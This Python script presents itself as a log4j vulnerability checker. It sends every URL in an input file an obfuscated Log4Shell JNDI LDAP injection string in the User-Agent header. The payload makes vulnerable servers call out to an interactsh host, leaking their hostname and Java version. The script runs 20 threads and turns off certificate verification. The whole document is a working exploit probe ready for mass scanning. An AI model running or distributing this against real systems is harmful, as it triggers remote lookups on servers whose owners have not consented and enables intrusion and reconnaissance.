from concurrent.futures import ThreadPoolExecutor
import argparse
import requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()
import colorama
colorama.init(autoreset=True)

# ${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xxx.interactsh.com/pocrequest}

def main():
    http = "https://"
    with open(input_file, "r") as myfile:
        content = myfile.readlines()

        with ThreadPoolExecutor(max_workers=20) as executor:
            for url in content:
                if url.startswith("http"):
                    http = ""
                # only use url and not banner
                if "," in url:
                    url_array = url.split(",")
                    url = url_array[0]
                executor.submit(start_poc, http + url.strip())

def start_poc(input_url):
    try:
        url = input_url
        session = requests.session()
        session.headers[
            "User-Agent"
        ] = "${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.c6rens5cefo0bvo539ngcg5qzhyyyyyyn.interactsh.com/pocrequest}"
        response = session.get(
            url=url,
            timeout=5,
            verify=False,
        )
        session.close()

        if response.status_code == 200:
            print(colorama.Fore.GREEN + url)

    except requests.exceptions.ConnectionError:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Check websites for log4j vulns."
    )
    parser.add_argument(
        "-i", type=str, default="./input.txt", help="Path to input file"
    )
    args = parser.parse_args()
    input_file = args.i
    main()